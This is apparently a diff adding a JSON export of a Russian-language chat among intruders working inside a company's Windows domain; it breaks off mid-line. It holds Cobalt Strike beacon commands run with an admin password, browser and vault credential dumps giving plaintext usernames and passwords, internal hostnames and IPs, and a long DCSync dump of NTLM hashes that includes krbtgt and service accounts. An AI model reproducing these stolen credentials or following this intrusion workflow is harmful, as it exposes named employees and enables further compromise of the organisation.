@@ -1,0 +1,483 @@
+{
+  "messages": [
+    {
+      "_id": "4ACmkxTaHhSRxzNe8",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-16T20:12:43.232Z",
+      "msg": "",
+      "file": {
+        "_id": "Z7JC2sbD9gbdiK6MH",
+        "name": "10.10.0.2_startup_config.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "10.10.0.2_startup_config.txt",
+          "title_link": "/file-upload/Z7JC2sbD9gbdiK6MH/10.10.0.2_startup_config.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T20:12:43.263Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fRGtRG7gJHm4G2Z4b",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-16T20:12:42.669Z",
+      "msg": "",
+      "file": {
+        "_id": "QqptPwqoNuek6XjA7",
+        "name": "10.10.0.3_running_config.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "10.10.0.3_running_config.txt",
+          "title_link": "/file-upload/QqptPwqoNuek6XjA7/10.10.0.3_running_config.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T20:12:42.714Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dQoqTKbLKxH9A6eov",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "`https://remote.itc-us.com/rdweb/pages/en-us/password.aspx` на рабочих столах админов заметил по смену пароля, интересно куда приведёт",
+      "ts": "2020-10-16T20:04:53.100Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T20:04:53.139Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "poPRZyw3Ngzn4X9yh",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "это с кредами",
+      "ts": "2020-10-16T19:38:21.635Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T19:38:21.663Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LeoHe8Quq682XhSnF",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nbeacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe NathanK ITC\\br_admin CAKE@horse369!@@\n[*] Tasked beacon to run .NET program: SharpSniper.exe NathanK ITC\\br_admin CAKE@horse369!@@\n[+] host called home, sent: 113781 bytes\n[+] received output:\n[-] Invoke_3 on EntryPoint failed.\n\n```",
+      "ts": "2020-10-16T19:38:17.917Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T19:38:18.001Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5Jc2e7MC4jaTG79Mi",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "это с токеном",
+      "ts": "2020-10-16T19:38:12.564Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T19:38:12.596Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "z875zBbTKMpuxxZF8",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nbeacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe NathanK\n[*] Tasked beacon to run .NET program: SharpSniper.exe NathanK\n[+] host called home, sent: 113721 bytes\n[+] received output:\n[-] Invoke_3 on EntryPoint failed.\n\n```",
+      "ts": "2020-10-16T19:38:06.911Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T19:38:07.001Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7mpfF6nasKtju2PFQ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "`NathanK` - на каких компах он был ?",
+      "ts": "2020-10-16T19:36:05.000Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T19:36:05.032Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9wRf6NvRMpkQDmDcG",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nURL      : http://itcma-mits01/mitsdiscover/doLogin.md\nUsername : jasonh\nPassword : Fall@ITC2020!\n```",
+      "ts": "2020-10-16T18:56:14.979Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T18:56:15.061Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5u3NXHoPZ4KctCAML",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nURL      : http://itcma-mits01/mitsdiscover/doLogin.md\nUsername : brandent\nPassword : HGp752308!\n\n--- Chromium Credential (User: brandent) ---\nURL      : https://login.verizonwireless.com/vzauth/UI/Login\nUsername : 5746121367\nPassword : HGp752301!\n\n```",
+      "ts": "2020-10-16T18:03:47.867Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T18:03:47.961Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EexhsSPyN9PQ3RftT",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\n--- IE/Edge Credential ---\nVault Type   : Web Credentials\nResource     : http://itcma-mits01/\nIdentity     : garya\nCredential   :  \nLastModified : 5/7/2020 4:03:55 PM\n\n--- IE/Edge Credential ---\nVault Type   : Web Credentials\nResource     : https://remote.itc-us.com/\nIdentity     : garya@itc-us.com\nCredential   : Wizz3r600\nLastModified : 5/4/2020 12:58:26 PM\n\n```",
+      "ts": "2020-10-16T17:53:37.293Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T17:53:37.399Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bRTKeZeyE2uhuLqYC",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nOU=Security Groups\nITCMA-RDS01.ITC.LOCAL\t\t10.0.0.8\nITCMA-RDS-SVR01.ITC.LOCAL\t10.0.0.6\n```",
+      "ts": "2020-10-16T17:43:39.585Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T17:43:39.664Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cRJS9ybDiLHzE9jqr",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": ":thinking:",
+      "ts": "2020-10-16T17:23:37.832Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T17:23:37.869Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cGapKPSsbe2DAMGt4",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\n[DC] 'ITC.LOCAL'\n```",
+      "ts": "2020-10-16T17:23:31.614Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T17:23:31.701Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6orHpqbuwCRgA47wv",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\n[DC] 'ITC.LOCAL' will be the domain\n[DC] 'ITCMA-FILE03.ITC.LOCAL' will be the DC server\n[DC] Exporting domain 'ITC.LOCAL'\n1307\tinfor-test\te3a0168bc21cfb88b95c954a5b18f57c\t66050\n1230\tSPInstall\tad145b1324989a3f7e1b045626778aea\t66050\n1232\tSPServices\t1b3e048d0a40d7c1fac55d6a99297b4b\t66050\n1304\tDHCPDNS\tdd3f1f083348928ac57db76899e77152\t66050\n5124\tMSOL_ff1eb51ea3ce\t98128e43603e7dfdeb1ca559bf8b8256\t66080\n1642\tMainConferenceRoom\tfe2e8e6e99ac9b05632c831324f708dc\t66050\n1643\tOperationsConference\tfe2e8e6e99ac9b05632c831324f708dc\t66050\n5677\tAZUREADSSOACC$\t89f488f470b5d44e9b31a762dee94eee\t69632\n8117\titcmarketing\t6aa8a83f5b896d92af48eec925d8714a\t512\n2146\titccommunications\t2ec7b543428ce4cdbde99026428942ed\t66048\n8191\tPCSetup\te3f462c08d32e3ba49ed3037037dada0\t512\n5347\tpaulaw\tb1f07bd1d38e076c00b9012f8f20a1a9\t514\n5297\tRyanQ\t8850823d1b5bf81b31242f4acd852eed\t514\n8143\tsimonw\tb1f07bd1d38e076c00b9012f8f20a1a9\t514\n8194\tbornz\t8574e1d48547de1139bc34ee4afb799b\t514\n5690\tDESKTOP-RCV5PNA$\t5e0ac7ff6f0987a30efeaa03816a9f17\t4096\n39604\tDESKTOP-AE0UUHL$\t7d8b22ab27a2841c7f2994a3eab6616e\t4096\n40104\tITCMA-WS1025$\t0ca84975a9eeb28c7bcddbf207c520fc\t4096\n5679\tfuntech\tcbe0e0e7bec3a940fa2f18b2b19bb27d\t66048\n1718\telkconference\t69d5ef661299dd1aafa3ff55e0c430c7\t66050\n5332\tElkProd2\t1417dde3ca1f67084b85fcbd6bcc1f97\t512\n8204\tTest_Primary\teb6538aa406cfad09403d3bb1f94785f\t66048\n40105\tDESKTOP-07M1VFM$\t6caaa5a92aa3c25fe10a60af41b871e5\t4096\n9110\teglchina\t08b0ec954a94d3c7f1824957bf3fde72\t66048\n6604\tITCMA-ESXI03$\tec4af0abf49ecbcc062d5d2f9b534c3a\t4096\n40129\tphoebel\t4eea3619d2e635f527a3eeb5d4810253\t514\n5219\tITCMA-WS1064$\ta5213099145a2f4b4e4ac46a3a315cda\t4096\n9126\tASITC-WS0040$\t8515777386ab6a8ec5a84d6a84f9b1b3\t4096\n40111\ttigera\t565b89a26b92e552143b5ab2d1643469\t514\n9127\tASITC-WS0044$\t6ecaee8af623e5576c5f016cedfa3dcc\t4096\n40146\tITC-CK-PC$\t0d343cec8d448c0c6c45b2dc0bd037d9\t4098\n5218\tITCMA-WS1065$\t5a3abb44e287f90fae60f11c832ee53a\t4096\n40162\tmarilynp\te62830daed8dbea4acd0b99d682946bb\t512\n5301\tAustinZ\t565b89a26b92e552143b5ab2d1643469\t514\n9111\tkevincopy\t2bc2a0308594f2e7481db79c9904e160\t514\n40121\tmasonl\t7e5792cca8031c0d2dc2c576be8d02e9\t514\n8139\tAndyG\tb1f07bd1d38e076c00b9012f8f20a1a9\t514\n40113\tjaniel\t535baf9cf1c3067f9e952cc093f47cea\t514\n40109\tkellyh\t08b0ec954a94d3c7f1824957bf3fde72\t66050\n40106\tKimJong\t08b0ec954a94d3c7f1824957bf3fde72\t66050\n40114\tnavyw\t7e5792cca8031c0d2dc2c576be8d02e9\t514\n5224\telkquality\te62830daed8dbea4acd0b99d682946bb\t512\n40167\trogerm\t950a6742fc3da61d118438d1728d604f\t512\n5660\tITCMA-WS1097$\td348eed65814c1a1f72606d6f07bfac1\t4128\n39634\tITCMA-WS1095$\tb884941346dedaf6d219ba05a51e1753\t4128\n40119\tITCMA-LT1025$\t6310bb849025ed7b333dd355d1740220\t4128\n6609\tITCMA-LT1007$\tf1e56d0a051db1659a732e6beac8dea3\t4096\n40176\telishav\tcbfbcd678b17a8e90ead8638a26eb79c\t512\n39610\tsvandyk\ted3ccdc38762122a9271c5208d47a301\t66048\n9119\tASITC-WS0031$\t2c994ffb54b64ce1034ad7a7b8a1db34\t4096\n9198\tASITC-WS0034$\t6b76cf6737a0e543376191ac3298fe10\t4096\n5111\tITCMA-WS1021$\tf70868955a189abd9cc466e4c01791ba\t4096\n40117\tevany\te62830daed8dbea4acd0b99d682946bb\t512\n39680\tPassPortalTest4\td8043111423e997954d32ef405d8ba4f\t66048\n39678\tPassPortalTest2\t75bf1e74747577ac3cc3022b8024b5d8\t66048\n39679\tPassPortalTest3\tef188f6919861aa64419642984d21864\t66048\n8112\tITCMA-WARROOM$\tbf3d3790654619faca38a562bbfc38d5\t4128\n9124\tASITC-WS0071$\taebe58ae5dad870b4000ae5ee82a76bd\t4096\n9189\tASITC-WS0032$\t8ddab2c440184c51cfa52715d4f11c63\t4096\n39633\tamazonfba\t38f41f2e718ae51efb693b25fb45ed49\t66048\n5327\tElkShipping\t85a60283d2ff2fbd2d40badac9f8a0fe\t512\n40157\tjessiel\t8d0f1edbb9f7ea4bbf078827f1cde656\t512\n5671\tITCMA-LT1064$\tbb74c335daff931f17adf9dd73dd0507\t4096\n39683\tnbktest\t18fd0c3e7f5d1485e5e46b86f4923ae3\t512\n40163\tmollieh\t70e19f6d815e259d52e69172094dc503\t512\n39664\trachelt\t740f70197f2cf7ce6f4e10ca6de5f8c0\t512\n5208\tinfor_edi_old\t1941c372c3c802defa0af03fddf10c04\t66050\n5341\tsophiac\tde43e1dcc48916c8096fd857d9619292\t514\n39612\trichb\t58aa5e467abb3c5961b0f82ba20782a8\t514\n5682\tlaurenj\t92670f877d5c6b94abcbb85de50dd647\t514\n5662\tkristaa\t8574e1d48547de1139bc34ee4afb799b\t514\n8172\tKatieD\t8574e1d48547de1139bc34ee4afb799b\t514\n5622\tDanW\teb450fca0a5bed7a5417b5cc9f7d295e\t514\n8145\tAlainaB\tba41503f5187aa6f2fbbd576b23b9dc9\t514\n9118\tASITC-WS0030$\t6db7e0cdcc84e6880df1dff0e9d80dcf\t4096\n1328\tITCMA-LT1018$\t147b80e8897d09b07ffdc0a898624336\t4096\n8147\tRebeckaC\ta64795a7d05999a0c2b429586799325c\t512\n39651\tnancyk\ta64795a7d05999a0c2b429586799325c\t512\n40115\tchaoq\tcebf8373c4e81a3109faa4043db329d9\t514\n40149\tjerretts\te485bbbd13a37e4c01272de95d4b644e\t514\n40161\tcarlosl\tf02f1e684771ad51a908ca043ce09733\t512\n39677\tPassPortalTest\t589b85762d8ab451401df29aa7fdc417\t66048\n39686\titccorporatecalendar\t589b85762d8ab451401df29aa7fdc417\t512\n5294\tMarkH\t7e8c067a506d3190fca59fd3fc61de61\t514\n1637\tDonnettaw\ta477358010d4eecc48a114f8b7bdb105\t512\n39681\tkellyb\t81bb9e0d650df6876cb9dacb2586b505\t512\n40182\tITCMA-LT1022$\tf83f07b0ef6a2600d91ba1fcbdd3d6a5\t4096\n2205\tITCMA-WS1024$\ta1d33625bce1fb2b27236a67b1bd3325\t4096\n9212\tASITC-WS0096$\t841ca8f92e93e1bad2c4a11412450e8a\t4096\n39695\tITCLab2\tbf1956f6cdff81985e99df817ab218c7\t512\n9129\tASITC-WS0013$\tbb1df45881daa0a52109b7694c8d4c0e\t4096\n40178\tITCMA-WS1028$\tcf129aa3bbbc16d90669cd646a453bfe\t4128\n9190\tASITC-WS0001$\td85302272ad9fccfa85ab06cfac2944a\t4096\n40174\tjerryt\t32b8ba6aaecbe2d456f2076012541e74\t512\n9216\tASITC-WS0097$\t8c8a0524e9cab69c33693891c4be7670\t4098\n4612\tITCMA-WS1054$\t8ff55e603b1249172edfaf3e5de18a7f\t4096\n39647\tPRODuser\t317e1d6c0c4eaa48b331df1a6310060b\t512\n5201\tITCMA-LT1030$\t4b9f8a314c36ce60329ebaea441fee84\t4096\n5236\tgalenw\t70586bc2191f0a0872798bcb30c7fcdf\t514\n5277\tITCMA-WS1077$\t647829b8512a3810780c2fd4fe66f96f\t4096\n39698\tedwardm\t3a37fbb6f2020618ebf9a8bab1f64dde\t512\n5618\tITCMA-WS1074$\t8b3c8ea7623bba2bb3e041a548e0a792\t4096\n8158\tITCMA-LT1066$\t9419e85545da2871cb542501b4cf0be2\t4096\n2210\tITCMA-WS1061$\t7fb0b7230dc444f3ebc6e3c6c418a697\t4096\n5637\tITCMA-WS1087$\tf01ed101778a0235811623ddd954f039\t4096\n40152\tmaxwellm\t273ca5b7b32220194ff7657572bc2a02\t512\n2218\tITCMA-WS1073$\ta6cf4f5d9f9c6b59c7a972d525449e90\t4096\n2215\tITCMA-LT1032$\t0600883b7fbe72cd3afe33b2781e50b9\t4096\n5298\tNathanK\tc59efdbb56e56613ecd45db5787b04da\t512\n5330\titcma-ws1091$\t1933cf26ff46aee9e3898ebac4936237\t4096\n9142\tASITC-WS0075$\t75233948358758b4dd0282f50108824e\t4096\n39697\tjuliew\t7d7883ad4dfafde4fd3d3811f8100167\t512\n40180\tASITC-WS0098$\t3b7e9417b27ac5752872171fe45e37ba\t4096\n9201\tASITC-WS0093$\t3f142e51193e786dfa669a832ee1e392\t4098\n2147\tElioCommunications\t2ec7b543428ce4cdbde99026428942ed\t66048\n39694\titclab1\t0ea4a865b25888558a0ae8b04c6f1162\t512\n5678\tit-imac$\t5e57fc72f37055885756da33f1e76e29\t4096\n2113\tCoreyB\t6578de80fdfdf6e2b607eadfbb189810\t544\n40175\tdasmondr\tc4dfe7c00de60ce6303229ff20a56b8b\t512\n40158\ttheodoren\tb88ff38608970d449d0ea007b9cefb5d\t512\n40151\tkarenh\tad1677745d36039bcfc0794be2a6cf94\t512\n1695\tthomasl\tdff852fcb8a279afdcfa4e005b1bacc8\t514\n40138\tmartinh\t70586bc2191f0a0872798bcb30c7fcdf\t514\n40116\ttinayu\t65d75e5a9d12ad87369cc0cb3b230dab\t514\n2157\tITCMA-VCEN01$\t5eca2e6d3c301ccabced38191da6e644\t4096\n1724\tRoyw\tacbfc03df96e93cf7294a01a6abbda33\t514\n8155\tIvanY\tcebf8373c4e81a3109faa4043db329d9\t514\n39632\ttimy\tcebf8373c4e81a3109faa4043db329d9\t514\n39649\tandrewz\t535baf9cf1c3067f9e952cc093f47cea\t514\n9112\tASITC-WS0051$\t5a86180ad668883a48ad7b207fb92905\t4096\n40150\tdennisc\tb5d62c1224046538a3fc5ee33f26b378\t512\n40153\tmichaelc\t7909b2d24e607f4f2fd7881160049700\t512\n40160\tjamesp\tfe50873f72b94169590015cb59630456\t512\n40159\tmaryf\td8f2665dd17622f840d7127a250338a1\t514\n9161\tASITC-WS0069$\t7481e6e9fe8486e1034ab06500260070\t4098\n5621\tITCMA-WS1078$\t357235dcf1bfaebd7e0d22f2a3e52a93\t4096\n1129\tdickh\t1c7866f2a9f7ab1d6601443f65512f69\t512\n2169\tKippU\t6fbf03d4087666a59be6156df406d27b\t514\n9188\tASITC-WS0046$\t840beaac0c660294b355fbb97ec7b787\t4096\n1654\tkirto\ta64795a7d05999a0c2b429586799325c\t512\n8108\tOliviaM\t83693bd82d5287fa53329e244f2b5bc0\t512\n9139\tASITC-WS0021$\t5663ec743caf9f7388488b2ad4b8d945\t4096\n40155\tjaredn\tb12d1fb1d52ee2de7285261d1401da83\t514\n9225\tASITC-WS0125$\t285f9f26cc7d4fe900b722093c731bbc\t4096\n8130\tITCMA-NAS02$\taee317af072ee03f7617bc92be21e602\t69632\n9205\tASITC-WS0016$\ta302e93852de55c7ba4c2840670215f0\t4096\n40165\telizabeths\t362c54be8465845c2e2e1ee6ad3f89a7\t512\n1120\tlindak\t2bc2a0308594f2e7481db79c9904e160\t514\n1246\tdawns\ta64795a7d05999a0c2b429586799325c\t512\n1207\tshellyb\ta64795a7d05999a0c2b429586799325c\t512\n39702\t___VMware_Conv_SA___\t440e42204080d9d1808de1c706d6c165\t66048\n1215\tccwong\t3eddbeb8fbbb24ad3145b1bb7efeee41\t66050\n1264\tFactory1\t36e12e09c91d45fdc66488df3d5b2baa\t66050\n1322\tjulianl\t8277d4760aba9737afdef8deee04d800\t66050\n1257\tleonc\te3a0168bc21cfb88b95c954a5b18f57c\t514\n1310\tLilyh\t175cb278577dab61c02b1b20f68075c2\t66050\n5143\tshmalyr\tcab165b1381d8f2fb1284181a8d79a2d\t514\n2202\tkennyc\t0fe26ffc5107e4b20c5a1a90d6368c10\t514\n1242\tSSL_Admin\tfe0cd4846440dbbb281d30949283d32d\t66048\n5207\tsupport_edi\t47a01baef13f7dd7065e9418d962e128\t66050\n5229\tMichelleG\t3910589ae3080bf99f0faf5aedf6bcd3\t514\n5237\tLPadgett\tbe8410683e173bc7eb4d4983016d4df5\t514\n5274\tsupport_pj\t525a8ecb2bd7de7b9f21cdb27901acf7\t66048\n1726\tAndrewl\t1d842980d5b71e8dc94627f4717fd3e5\t66050\n8106\tjanec\tceac614e57e88a8cf43196e05bcb6e70\t514\n5328\tFairyY\t568d109272f3aa9a1de5460a26e0b3d4\t514\n1153\telkwarehouse2\te37bf2e00afb4d3cac811f26f52d9ca7\t514\n5135\tRickc\t7535e15737dc6a6f9dbbdae6164687c1\t514\n1697\tgloriak\t1b7f0e3eb4a557a2acbb426852337c42\t514\n1266\tstevenj\tf199f4354f200b30497f70aa76e86a2c\t514\n9138\tsh_admin\t433f858db8d9cad2334051f378c37ddf\t512\n5245\tITCMATEST\te39f2af4d496348f1ed435ca236fc1cc\t514\n2150\tmichaelb\ta56c8954f922afb90fa3b92e7525fb19\t66050\n2209\tkellib\tb48f1b5491446d29af4ac03a7425cd1c\t514\n1117\tbrianp\t1304285dadeee9310ec81148b05bb5dd\t514\n5137\tannetteh\t87588e1455da040d8b49953d79921b4a\t514\n2134\tbu_veeam\tb27c2ff6c11408721a28f0a4f6f16a83\t66048\n41105\taadsync\t0cb6232407ea46c3d3f704cba48c5f56\t66048\n39660\tPassportalSync\t978f9dd19c43883714f73acd99500cb0\t66080\n5241\tpasswordnotify$\t182e24b2711b192713ef950fc1c0ed7f\t4096\n6607\tegltech\tf5c2d037fbddf81469809c06802c4acf\t66048\n8156\tSLETest\t35a2a46fa8d8b8578d7502ae53c42272\t512\n2198\tITCMA-LT1029$\te78b195fdad2c2910c952221ce5da765\t4096\n1684\tkenw\t337fc9e65995c5c4fbfea451346b1df6\t512\n5670\tITCMA-LT1063$\t7b87606f1a9f613a0d830ea2ef0c82a3\t4096\n5343\twarehouse3\t16687489c6824897f2585c58fb345ad2\t66050\n40166\tjosephr\tf4bd4fda1036ee1fad27d0d9ef61ce1a\t512\n1614\tsuperlogin\t29812263b384df487b49ca82f3b4be48\t66048\n40144\tadvpn\t08b0ec954a94d3c7f1824957bf3fde72\t66048\n5112\tITCMA-WS1053$\t4b8169fdf315879a4fcb70e1efd78025\t4096\n1130\tgaryl\t9101d0697357be9c6b98b784f9ccf979\t512\n5283\tITCMA-LT1040$\t11826271c727134f1092458c333df6e9\t4096\n1640\tLynnV\tdc4468f73da3ad8810c65829e76ff826\t512\n40172\tnicoles\t32e238f08016761a5be98cd1ffd40070\t512\n1116\tdenniss\t6681a0025a1066ee85ffee6a9f53a2fd\t66050\n40173\tandrewr\te116c5d8e0df37e1bc56100fdc069014\t512\n40197\tjamies\t1c49c9cc354ee8c1cef58c9193be2344\t512\n5658\ttonyk\t80eb29c49eebac198658d488970fcd8e\t512\n9193\tASITC-WS0009$\tee58fb1dcdefc20f1f81868c21522f87\t4096\n9150\tASITC-WS0063$\tb2dd61db2862f89990834fc039e32f95\t4096\n8201\talicew\t74793827f352c557c04a4da6a607adb4\t512\n2155\thky\t81a4511c75e09afaf04bb0e28a7ddce2\t512\n39675\tlorencec\t91578f59a0caeaaabb0b5a2370ded6b1\t512\n8199\tITCMA-LT1028$\t81fb2eb37a0f2e911c7b0313d3ca73ae\t4096\n40170\tadrianar\t878691045748baa727bea9882c13eafe\t512\n9152\tASITC-WS0039$\t9f0043969a59b02b23f7847cebc6a628\t4096\n40200\thannahc\tc90c4669684f518d36771155d56f3ea2\t512\n5665\tITCMA-LT1057$\t2e4fb682d249cf53e7049a299aabce5a\t4096\n39611\tegladmin\td64655136d7f93780715bb1a83f7b40b\t66048\n40164\tleonr\tdc85c733b853158f3dc3346f19fa78f9\t512\n1251\tUPSAdmin\td54feab3ae1cd743c74bd79e9c63aa36\t514\n5276\tITCMA-WS1076$\t044197422e06f63efe35a9ac8c249290\t4096\n39676\tssoadmin\t3e4ec6517ffcc07a51059ebe8b9a05f4\t512\n9187\tASITC-WS0055$\t5745fa49aaa4a565eab048edb15910d8\t4096\n40156\tangelaf\t768139be80286a507b64b80eba0d4dd5\t514\n40154\tdavidh\te62830daed8dbea4acd0b99d682946bb\t512\n40168\tdaniels\td5993216e22e06efaf21d076b8c3f8e3\t512\n2164\tjamesm\tba4e5946331fc545914ecc9cbc8a3b53\t512\n39662\tpaustin\t32ba59e63c228fc531b6e14a370d72ba\t512\n502\tkrbtgt\t81e28a7bf06c3bff02feee793bcab78a\t514\n1151\twarehouse1\t67e4c62179d56d0f922105ee5681282c\t514\n1340\tITCMA-LT1020$\tbd9a72e6b1d7e261d75b1cc6e26d4791\t4096\n40123\tITCMA-LT1075$\tb82a59b0c5dc2046905ed60aa6ed25d9\t4096\n39668\tITCMA-LT1027$\ta2dd537e33316e38637bc3e59df222b4\t4096\n41117\tWINDEV2004EVAL$\tc0334b629816e40e72731aabfbb0a973\t4096\n1694\tangiel\t33a26f76c61382ae500caccbca82803f\t514\n40135\tkristiev\t2f3efe73d291da6e7ddc9b54c238c308\t514\n41116\tchrishoyt\t25f900466b55ec728305c13027d24022\t512\n41115\tterrin\tf9ee54b70f789caa6dd292c307a6250e\t512\n9219\tASITC-WS0113$\tac138f958fd09c5d7c28923be16b4f14\t4096\n5291\tITCMA-LT1041$\t7a67bdc20dce79ff44ce97d9fdc30c1d\t4096\n1231\tSPFarm\tcc9bf398b6e637a2e7f708ea458c2105\t66050\n9226\tASITC-WS0128$\t3db5793500addec855f3787e33922c6d\t4096\n1313\tsslvpn\t0530e010fd31ed782ec4fc0d79231c5a\t66050\n39613\tAAD_4e4f0fe8f058\t08b0ec954a94d3c7f1824957bf3fde72\t66048\n41104\tAAD_ee11aef66e2f\t29311b26b9f3ef13e822d3263e4fa38f\t66048\n1138\tdank\t1a487688d1beba344274d40af2b7707a\t512\n5314\tITCMA-WS1090$\t074587b98978eb67005a7041f2851c38\t4096\n9223\tASITC-WS0108$\tefc5c2fa304ecddacd8f4cf78c331290\t4096\n41108\ttesting\t3e85d5a1410e277a4e7084c253810157\t512\n1337\tdeang\t73d9e66b9131e12f52c441e208deaca0\t66048\n40206\tmicks\tac2ac419036fd91e05aac746c8660a55\t512\n6608\tvmware\t3b224b954ae6a5bfca10a1c8688bfbbb\t66048\n8144\tITCMA-LT1060$\t660048976bb4b1cb09c26d89bbd1de2d\t4096\n8113\tITCMA-WS1098$\tda533071e95834308f4e8ed581ec335e\t4096\n8168\tMisc01\tf2d429b35f633b12eefbee498aafbad2\t512\n2189\tITCMA-LT1026$\t92ff8ee0302d42f44d6f29de25760b45\t4096\n39629\tITCMA-LOANER1$\td7615b90d36bb108ead3e08ff636cc9c\t4096\n5174\tSLEAdmin\tb28bc7ab76873471029a9ad657f75d18\t66048\n8185\tSurvey\t7c5282ddad27303ae14390a5dde567f9\t512\n5293\tITCMA-LT1043$\t01363845f89c79d100b3ce008d9ddbe7\t4128\n8153\tJessieC\td92029926067bd7fed56b72ffda8e62a\t512\n5192\tITCMA-WS1027$\t4f4f2bf597a258f7e68d53ed59f2ca4c\t4096\n1240\tPaceJet\t06af9d10811d1951f7afd09efbebf6c6\t66048\n5633\tMataC\tedbeb07a3c05e55b8721ac23f294bcb2\t512\n5669\tITCMA-LT1062$\tbd08015476bc185b984785efbff43bf7\t4096\n39630\tmichellew\tcef2eb521883d390b32b0b5bb916f7bb\t512\n1127\tlorin\t7c8566e384468b76fe9c11f5ef635422\t512\n40120\ttimothym\tcef2eb521883d390b32b0b5bb916f7bb\t512\n39628\tITCMA-LT1073$\t04fba433f154bc3b66b780f110a64bac\t4096\n5216\tITCMA-WS1062$\te622588e1a0b5bfcac19cb13cc0296b1\t4096\n1689\trachelp\t9a4c3fbbf6e6b1fe805d0ffc7378f0d9\t512\n9144\tASITC-WS0084$\t4b897158c8ef783510626ee501d67a23\t4096\n5648\twarehouse2\t1628488e442316500a176701e0ac3c54\t512\n40204\tITCMA-CR01$\tc683d967ce29df38afbd1eff4f69e9f2\t4096\n5338\tEricG\t98884d9fd2e6def74cbb7bbb34dd650f\t512\n9211\tthird\t70586bc2191f0a0872798bcb30c7fcdf\t66048\n9217\tASITC-WS0101$\t6dc65547a71877b96f32eb43fbf8eacb\t4096\n40133\thudreceiving\t1d32ad40cecbc0419f99a08e0845dd66\t512\n1715\tterminals\tbdf0593666f4484c2860800af6834eb2\t512\n9199\tASITC-WS0010$\t343a3b47f144eb6784cf1f86893ad207\t4096\n9121\tASITC-WS0036$\taed48f171fd46be32ae4a4269032653a\t4096\n2141\tlinconf\t4c3879fef394fa5dce0037c197c70841\t512\n1698\tITCMA-ENG01$\tdf61c05ce9fd0f68a79a6006bb7b0f26\t4096\n1716\tflexlight\t984cb3817e444c7e325ad0c4a471a74f\t512\n5683\tITCMA-LT1068$\t7a94bf2ca843c714bb1e69b840fafb80\t4096\n1665\tELKUPSUser\tdc4b02eb894f18b53d78197c8ffe024c\t512\n5308\tRichW\t